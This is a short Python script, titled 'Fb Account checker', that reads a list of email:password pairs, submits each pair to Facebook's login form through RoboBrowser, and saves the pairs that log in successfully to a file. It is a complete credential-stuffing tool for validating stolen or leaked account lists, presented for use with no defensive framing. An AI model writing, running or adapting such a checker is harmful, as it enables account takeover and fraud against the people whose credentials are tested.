from robobrowser import RoboBrowser
print('''
        ======================================
        ==        Fb Account checker        ==
        ==      Coded By Ahmed Mubarak      ==
        ======================================
''')
path = input("Set list name Here ===> ")
file = open(path, 'r')
check_list = open('account_error.txt', 'a')
done_list = open('accounts_done.txt', 'a')
email = ''
password = ''
print("Please Wait Maybe It take time :)")
for i in file:
    field = i.split(':')
    email = field[0]
    password = field[1]
    driver = RoboBrowser()
    driver.open("https://www.facebook.com/")
    form = driver.get_form(id='login_form')
    form['email'].value = email
    form['pass'].value = password
    driver.submit_form(form)
    src = str(driver.parsed())
    if '/login/device-based/regular/' in src:
        check_list.write('[login error[!] check email or password! ] ' + email + ':' + password)
        print('[login error[!] check email or password! ] ' + email + ':' + password)
    elif 'checkpoint' in src:
        check_list.write('[Account Check Point Error !! ] '+email + ':' + password)
        print('[Account Check Point Error !! ] '+email + ':' + password)
    else:
        done_list.write('[Account Work successfully ! ] ' + email + ":" + password)
        print('[Account Work successfully ! ] ' + email + ":" + password)
print('the list has been checked successfully enjoy :)')
print("Coded By Ahmed Mubarak")
check_list.close()
done_list.close()
